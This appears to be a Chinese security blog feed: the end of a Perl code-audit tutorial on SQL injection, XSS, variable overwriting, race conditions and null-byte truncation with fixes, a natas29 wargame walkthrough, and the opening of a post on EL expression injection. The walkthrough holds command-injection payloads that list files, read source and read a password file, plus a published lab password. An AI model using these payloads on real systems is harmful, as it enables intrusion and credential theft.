预编译SQL语句，注意占位符?的使用</span></span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = ?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL语句</span></span><br><span class="line">$sth-&gt;execute($username) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环输出所有数据</span></span><br><span class="line"><span class="keyword">while</span> ( <span class="keyword">my</span> @row = $sth-&gt;fetchrow_array() )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">':'</span>, @row).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;disconnect();</span><br></pre></td></tr></table></figure>
<p>此时预编译会将占位符的内容定死为参数值而不会将其中的某些字符串解释为SQL关键字，也就根源上解决了SQL注入问题：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/19.png" alt=""></p>
<p>但是，如果没有正确使用预编译占位符，如下代码，在prepare()函数中直接拼接变量，就会同样存在SQL注入问题：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预编译SQL语句，未使用占位符?而是采用变量拼接的方式</span></span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = '$username'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL语句</span></span><br><span class="line">$sth-&gt;execute() <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br></pre></td></tr></table></figure>
<p>此时就能被SQL注入攻击：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/20.png" alt=""></p>
<p><strong>结论：在prepare()函数进行预编译操作的时候，需要输入的参数值必须使用占位符，禁止直接使用变量拼接SQL语句。</strong></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS是Web前端最常见的漏洞，Perl中也不缺席，关键还是在于Perl代码有没有进行HTML实体编码或者过滤特殊字符之后再输出到页面上。</p>
<p>比如下面CGI直接将参数原样不动返回到界面中：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line">$cgi = CGI-&gt;new();</span><br><span class="line"><span class="keyword">print</span> $cgi-&gt;param(<span class="string">'p'</span>);</span><br></pre></td></tr></table></figure>
<p>此时，就会产生XSS问题：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/36.png" alt=""></p>
<p>正确防御方法是进行HTML实体编码后再输出页面中：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> CGI::escapeHTML($cgi-&gt;param(<span class="string">'p'</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/37.png" alt=""></p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>Perl语言的一些特性会导致存在一些变量覆盖问题，而变量覆盖往往会导致一些检测机制被绕过或者造成越权漏洞的产生。</p>
<h4 id="哈希引入数组变量覆盖"><a href="#哈希引入数组变量覆盖" class="headerlink" title="哈希引入数组变量覆盖"></a>哈希引入数组变量覆盖</h4><p>Perl的哈希中如果引入了数组，那么数组将会按键对值的结构扁平展开到哈希中，此时存在变量覆盖漏洞。</p>
<p>看个Demo，在hash中引入list，其中list包含hash中的一个键user并设置了对应的值admin：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">@list = (<span class="string">"member"</span>, <span class="string">"user"</span>, <span class="string">"admin"</span>);</span><br><span class="line"></span><br><span class="line">%hash = (</span><br><span class="line">    <span class="string">"user"</span> =&gt; <span class="string">"mi1k7ea"</span>,</span><br><span class="line">    <span class="string">"password"</span> =&gt; <span class="string">"666"</span>,</span><br><span class="line">    <span class="string">"level"</span> =&gt; @list</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (($k, $v) = <span class="keyword">each</span> %hash) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$k: $v\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出，看到list中的键及值直接覆盖了原有的user键值对：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/21.png" alt=""></p>
<p>延伸到CGI场景中同理：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new();</span><br><span class="line"></span><br><span class="line">%user_info = (<span class="string">"username"</span> =&gt; $cgi-&gt;param(<span class="string">"username"</span>), <span class="string">"password"</span> =&gt; <span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (($k, $v) = <span class="keyword">each</span> %user_info) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$k: $v\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常请求<code>/test.cgi?username=guest</code>时，返回结果如下：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/31.png" alt=""></p>
<p>但是，当传入URL参数的key重复多次时<code>/test.cgi?username=guest&amp;username=username&amp;username=admin</code>，返回结果：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/32.png" alt=""></p>
<p>看到username参数被数组变量覆盖了。原理同上，即当URL传入多个同名参数时，<code>$cgi-&gt;param()</code>函数返回的是一个列表，输入参数<code>username=test&amp;username=username&amp;username=admin</code>时返回的是<code>(&quot;test&quot;, &quot;username&quot;, &quot;admin&quot;)</code>，此时数组就会和哈希结构进行合并，第一个元素guest则设置成username键的值，剩下的username和admin则单独组成为一对键值，新生成的键值对会覆盖掉原本的username的值为admin了。</p>
<p><strong>案例——CVE-2014-1572（Bugzilla越权漏洞）</strong></p>
<p>漏洞代码如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $otheruser = Bugzilla::User-&gt;create(&#123;</span><br><span class="line">    <span class="string">login_name =&gt;</span> $login_name,</span><br><span class="line">    <span class="string">realname   =&gt;</span> $cgi-&gt;param(<span class="string">'realname'</span>),</span><br><span class="line">    <span class="string">cryptpassword =&gt;</span> $password&#125;);</span><br></pre></td></tr></table></figure>
<p>当提交下面请求内容时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=confirm_new_account&amp;t=[TOKEN]&amp;passwd1=[password]&amp;passwd2=[password]</span><br><span class="line">&amp;realname=test&amp;realname=login_name&amp;realname=admin@bugzilla.org</span><br></pre></td></tr></table></figure>
<p>此时传递给User-&gt;create()函数的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    realname =&gt; &apos;test&apos;,</span><br><span class="line">    login_name =&gt; &apos;admin@bugzilla.org&apos;,</span><br><span class="line">    cryptpassword =&gt; $password</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里漏洞根源正式往<code>{}</code>即哈希中传入数组，利用上述的特性导致变量覆盖从而导致越权漏洞的产生。</p>
<h4 id="数组传参变量覆盖"><a href="#数组传参变量覆盖" class="headerlink" title="数组传参变量覆盖"></a>数组传参变量覆盖</h4><p>Perl的函数参数传递中如果传递的参数类型为数组，那么数组将会直接展开来赋值到对应位置的参数上，此时同样存在变量覆盖漏洞。</p>
<p>看个Demo，test()函数可传入三个参数，然后分别给其传入不同数量、某个参数类型为数组的参数：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    ($a, $b, $c) = @_;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$a$b$c\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">test((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">test(<span class="number">1</span>, (<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">test(<span class="number">1</span>, (<span class="number">2</span>, <span class="number">3</span>), <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/22.png" alt=""></p>
<p>可以看到，当传递给子程序的参数即便不够，传递的数组会被展开并赋值给a、b、c三个变量上；最后一个调用的第三个传入参数4并没有赋值给c变量。</p>
<p>这种数组传参覆盖的特性有啥安全问题？看个例子。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">sqli_filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">my</span> ( $str, $type ) = @_;</span><br><span class="line">    <span class="keyword">defined</span> $str <span class="keyword">or</span> <span class="keyword">return</span> <span class="string">"NULL"</span>;</span><br><span class="line">    <span class="keyword">defined</span> $type &amp;&amp; ( $type == <span class="number">6</span> )</span><br><span class="line">        <span class="keyword">and</span> <span class="keyword">return</span> $str;</span><br><span class="line"></span><br><span class="line">    $str =~ <span class="regexp">s/\\/\\\\/sg</span>;</span><br><span class="line">    $str =~ <span class="regexp">s/\'/\\\'/sg</span>;</span><br><span class="line">	$str =~ <span class="regexp">s/\"/\\\"/sg</span>;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cgi = CGI-&gt;new();</span><br><span class="line"><span class="keyword">my</span> $user = sqli_filter($cgi-&gt;param(<span class="string">'user'</span>));</span><br><span class="line"><span class="keyword">print</span> <span class="string">"User Input After Filter: "</span>.$user.<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $dsn = <span class="string">"DBI:mysql:database=test:localhost"</span>;</span><br><span class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>($dsn, <span class="string">"root"</span>, <span class="string">"root"</span>) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * FROM users where username = '$user'"</span>);</span><br><span class="line">$sth-&gt;execute() <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"SQL Query Result:&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="keyword">my</span> @row = $sth-&gt;fetchrow_array() )&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">':'</span>, @row).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth-&gt;finish();</span><br><span class="line">$dbh-&gt;disconnect();</span><br></pre></td></tr></table></figure>
<p>这个CGI程序会从Web端接收一个user参数，然后通过自定义的sqli_filter()函数进行SQL注入特殊字符转义处理，最后查询数据库中对应的用户信息（假设为正确使用预编译进行SQL语句处理）。</p>
<p>正常访问，输入用户名即可查询用户信息：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/33.png" alt=""></p>
<p>尝试进行SQL注入获取所有用户信息，注入<code>?user=testuser&#39; or 1--+</code>，发现单引号被转义了：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/34.png" alt=""></p>
<p>结合数组参数变量覆盖，注入<code>?user=testuser&#39; or 1--+&amp;user=6</code>，可以看到成功进行了SQL注入，绕过了sqli_filter的检测过滤：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/35.png" alt=""></p>
<p>导致sqli_filter被绕过的漏洞根源在于，给该函数传递的是一个数组参数，通过变量覆盖的特性将type变量值给覆盖为了6，从而绕过了检测逻辑。</p>
<h3 id="随机数安全"><a href="#随机数安全" class="headerlink" title="随机数安全"></a>随机数安全</h3><p>Perl中的rand()函数只是从标准C库中调用相应的rand()函数，而C库函数rand()是一个不安全随机函数、其生成的数字不是加密安全的。</p>
<p>在C/C++安全编码规范中也明确禁止使用rand()产生用于安全用途的伪随机数。</p>
<p>强伪随机数CSPRNG（安全可靠的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator）的各种参考：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Platform</th>
<th style="text-align:left">CSPRNG</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP</td>
<td style="text-align:left">mcrypt_create_iv, openssl_random_pseudo_bytes</td>
</tr>
<tr>
<td style="text-align:left">Java</td>
<td style="text-align:left">java.security.SecureRandom</td>
</tr>
<tr>
<td style="text-align:left">Dot NET (C#, VB)</td>
<td style="text-align:left">System.Security.Cryptography.RNGCryptoServiceProvider</td>
</tr>
<tr>
<td style="text-align:left">Ruby</td>
<td style="text-align:left">SecureRandom</td>
</tr>
<tr>
<td style="text-align:left">Python</td>
<td style="text-align:left">os.urandom</td>
</tr>
<tr>
<td style="text-align:left">Perl</td>
<td style="text-align:left">Math::Random::Secure</td>
</tr>
<tr>
<td style="text-align:left">C/C++ (Windows API)</td>
<td style="text-align:left">CryptGenRandom</td>
</tr>
<tr>
<td style="text-align:left">Any language on GNU/Linux or Unix</td>
<td style="text-align:left">Read from /dev/random or /dev/urandom</td>
</tr>
</tbody>
</table>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争漏洞的根源在于两个逻辑相关的操作之间的执行存在时间差，而攻击者可以利用这个时间差来绕过某些逻辑实现攻击。</p>
<p>比如这段代码，先判断目标文件是否存在，如果不存在则创建并写入内容：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unless</span> (-e <span class="string">"/tmp/a_temporary_file"</span>) &#123;</span><br><span class="line">	<span class="keyword">open</span> (FH, <span class="string">"&gt;/tmp/a_temporary_file"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这种情况下，这个时间差是指TOCTOU（检查时间-使用时间）。这里检测文件是否存在和打开写入文件两个操作之间存在一个时间差。如果攻击者利用这个时间差，在程序检测到文件不存在后就立即执行如下命令创建软链接到某个重要配置文件，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /tmp/a_temporary_file /etc/an_important_config_file</span><br></pre></td></tr></table></figure>
<p>此时，程序过完这个时间差再来执行打开写入目标文件的操作时，由于目标文件已经被攻击者篡改为软链接因此会导致该重要配置文件被删除。</p>
<p>通常，最好的解决方法是在可能存在竞争条件的地方使用原子操作。这意味着仅使用一个系统调用即可检查文件并同时创建该文件，而不会给处理器提供机会在两者之间切换到另一个进程。</p>
<p>在刚刚的示例中，可以使用sysopen()函数并指定只写模式，而无需设置truncate标志来避免条件竞争的问题：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unless</span> (-e <span class="string">"/tmp/a_temporary_file"</span>) &#123;</span><br><span class="line">    <span class="comment">#open (FH, "&gt;/tmp/a_temporary_file"); </span></span><br><span class="line">    <span class="keyword">sysopen</span> (FH, <span class="string">"/tmp/a_temporary_file"</span>, O_WRONLY);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，即使文件名被篡改了，但是当打开文件进行写入时也不会杀死它。</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>类似PHP，Perl中也存在00截断的问题。</p>
<p>如下代码，假设file变量值”xxx”是外部可控的值，程序本意是想打开用户输入的值拼接上”.txt”后缀名的文件：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$file = <span class="string">"xxx"</span>;  </span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"$file.txt"</span>);</span><br></pre></td></tr></table></figure>
<p>此时，如果攻击者输入<code>test%00</code>，此时由于%00在URL解码变为0x00，其在Perl中代表了字符串的结束，因此open()函数打开的是”test”文件而不是”test.txt”文件。</p>
<p>当然，00截断的特性通常是结合其他漏洞进行组合绕过利用的，具体场景具体分析。</p>
<h2 id="0x03-Perl漏洞实战"><a href="#0x03-Perl漏洞实战" class="headerlink" title="0x03 Perl漏洞实战"></a>0x03 Perl漏洞实战</h2><p>看个Perl漏洞靶场：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://natas29.natas.labs.overthewire.org</span><br><span class="line">username:natas29</span><br><span class="line">password:airooCaiseiyee8he8xongien9euhe8b</span><br></pre></td></tr></table></figure>
<p>访问目标站点，可以选择下拉框选项，这里点击”perl underground”后页面返回大量内容：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/23.png" alt=""></p>
<p>注意到参数名为file，推测后台是根据传入的参数名再传递给open()函数来打开处理。</p>
<p>尝试下open()函数的命令注入，输入<code>|ls</code>，注意管道符在前面是有回显的：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/24.png" alt=""></p>
<p>风平浪静，肯定是姿势不对。推测下原因，用open()函数打开的文件一般是要有后缀名的，而选项中的这几个file参数值都是不带后缀名的，那么就应该是后台对file参数值和后缀名进行一个拼接操作再open的。如果是这样，就能利用%00截断来截断掉后面拼接的后缀名使open()函数能够正确执行注入的命令。</p>
<p>输入<code>|ls%00</code>：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/25.png" alt=""></p>
<p>没毛病，通过%00截断的方式命令成功执行了，页面列出了当前目录下的所有文件。</p>
<p>我们看下index.pl的源码，输入<code>|cat index.pl%00</code>：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/26.png" alt=""></p>
<p>页面不太好看，直接看页面源码就得到index.pl的源码了：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw(:standard)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">Content-Type: text/html; charset=iso-<span class="number">8859</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 4.01//EN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- This stuff in the header has nothing to <span class="keyword">do</span> with the level --&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/level.css"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/jquery-ui.css"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/wechall.css"</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://natas.labs.overthewire.org/js/jquery-1.9.1.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/natas.labs.overthewire.org/js</span><span class="regexp">/jquery-ui.js"&gt;&lt;/script</span>&gt;</span><br><span class="line">&lt;script src=http:<span class="regexp">//natas</span>.labs.overthewire.org/js/wechall-data.js&gt;&lt;<span class="regexp">/script&gt;&lt;script src="http:/</span><span class="regexp">/natas.labs.overthewire.org/js</span><span class="regexp">/wechall.js"&gt;&lt;/script</span>&gt;</span><br><span class="line">&lt;script&gt;var wechallinfo = &#123; <span class="string">"level"</span>: <span class="string">"natas29"</span>, <span class="string">"pass"</span>: <span class="string">"airooCaiseiyee8he8xongien9euhe8b"</span> &#125;;&lt;<span class="regexp">/script&gt;&lt;/head</span>&gt;</span><br><span class="line">&lt;body oncontextmenu=<span class="string">"javascript:alert('right clicking has been blocked!');return false;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#content &#123;</span></span><br><span class="line">    width: <span class="number">1000</span>px;</span><br><span class="line">&#125;</span><br><span class="line">pre&#123;</span><br><span class="line">    background-color: <span class="comment">#000000; </span></span><br><span class="line">    color: <span class="comment">#00FF00; </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;h1&gt;natas29&lt;/h</span>1&gt;</span><br><span class="line">&lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line">END</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># morla /10111</span></span><br><span class="line"><span class="comment"># '$_=qw/ljttft3dvu&#123;/,s/./print chr ord($&amp;)-1/eg'</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># credits for the previous level go to whoever </span></span><br><span class="line"><span class="comment"># created insomnihack2016/fridginator, where i stole the idea from. </span></span><br><span class="line"><span class="comment"># that was a fun challenge, Thanks! </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">H3y K1dZ,&lt;br&gt;</span><br><span class="line"><span class="keyword">y</span><span class="number">0</span> rEm3mB3rz p3Rl rit3?&lt;br&gt;</span><br><span class="line">\\/\\/<span class="number">4</span>Nn4 g<span class="number">0</span> olD5kewL? R3aD Up!&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.pl"</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> name=<span class="string">"file"</span> onchange=<span class="string">"this.form.submit()"</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">""</span>&gt;s3lEcT suMp1n!&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground"&gt;perl underground&lt;/option</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">"perl underground 2"</span>&gt;perl underground <span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground 3"&gt;perl underground 3&lt;/option</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">"perl underground 4"</span>&gt;perl underground <span class="number">4</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground 5"&gt;perl underground 5&lt;/option</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">&lt;/form</span>&gt;</span><br><span class="line"></span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(param(<span class="string">'file'</span>))&#123;</span><br><span class="line">    $f=param(<span class="string">'file'</span>);</span><br><span class="line">    <span class="keyword">if</span>($f=~<span class="regexp">/natas/</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"meeeeeep!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">open</span>(FD, <span class="string">"$f.txt"</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        <span class="keyword">while</span> (&lt;FD&gt;)&#123;</span><br><span class="line">            <span class="keyword">print</span> CGI::escapeHTML($_);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">&lt;div id=<span class="string">"viewsource"</span>&gt;c4n Y<span class="number">0</span> h4z s4uc3?&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/div</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/html</span>&gt;</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>从源码看到，关键的漏洞点就是<code>open(FD, &quot;$f.txt&quot;);</code>，这里直接将外部输入的file参数和后缀名”.txt”拼接后直接放进open()函数中执行，导致了命令注入漏洞的存在。</p>
<p>靶场的要求是获得下一关即第30关的密码，这里看源码发现检测file参数值是否存在”natas”，因此需要结合一些shell技巧来绕过这个检测，可以输入如下一些命令绕过并搜索下一关的相关文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|find / -name nat&apos;&apos;as30%00</span><br><span class="line">|find / -name nat&quot;&quot;as30%00</span><br><span class="line">|find / -name nat``as30%00</span><br><span class="line">|find / -name nat\as30%00</span><br><span class="line">|find / -name nat?s30%00</span><br><span class="line">|find / -name nat$&#123;x&#125;as30%00</span><br><span class="line">|find / -name nat$(echo a)s30%00</span><br><span class="line">|find / -name nat`echo a`s30%00</span><br><span class="line">|find / -name n$&#123;SHELLOPTS:2:1&#125;t$&#123;SHELLOPTS:2:1&#125;s30%00 # failed</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/24/Perl基础-代码审计/27.png" alt=""></p>
<p>最后读取该文件即可<code>|cat /etc/nat&#39;&#39;as_webpass/nat&#39;&#39;as30%00</code>：</p>
<p><img src="/2020/11/24/Perl基础-代码审计/28.png" alt=""></p>
<p>小结：该场景的漏洞点在于open()函数命令注入+%00截断。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cgisecurity.com/lib/sips.html" target="_blank" rel="noopener">Security Issues in Perl Scripts</a></p>
<p><a href="https://www.shellcodes.org/Perl/Perl%E5%AE%89%E5%85%A8.html" target="_blank" rel="noopener">Perl 安全</a></p>
]]></content>
      <categories>
        <category>Perl</category>
      </categories>
      <tags>
        <tag>Perl</tag>
        <tag>Web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>（先知首发）浅析EL表达式注入漏洞</title>
    <url>/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p>
<h2 id="0x01-EL简介"><a href="#0x01-EL简介" class="headerlink" title="0x01 EL简介"></a>0x01 EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p>
<p>EL表达式主要功能如下：</p>
<ul>
<li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li>
<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>${user==null}</code>；</li>
<li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li>
<li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li>
</ul>
<h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><h3 id="EL语法"><a href="#EL语法" class="headerlink" title="EL语法"></a>EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以<code>${}</code>表示。例如，<code>${ userinfo}</code>代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：<code>${ pageScope. userinfo}</code>表示访问page范围中的userinfo变量。</p>
<p>简单地说，使用EL表达式语法：<code>${EL表达式}</code></p>
<p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p>
<p>扩展JSP代码的写法总结：</p>
<ul>
<li><p>JSP表达式：<code>&lt;%=变量或表达式&gt;</code></p>
<p>向浏览器输出变量或表达式的计算结果。</p>
</li>
<li><p>JSP脚本：<code>&lt;%Java代码%&gt;</code></p>
<p>执行java代码的原理：翻译到_jspService()方法中。</p>
</li>
<li><p>JSP声明：<code>&lt;%!变量或方法%&gt;</code></p>
<p>声明jsp的成员变量或成员方法。</p>
</li>
<li><p>JSP注释：<code>&lt;%!--JSP注释--%&gt;</code></p>
<p>用于注释JSP代码，不会翻译到Java文件中，也不会执行。</p>
</li>
</ul>
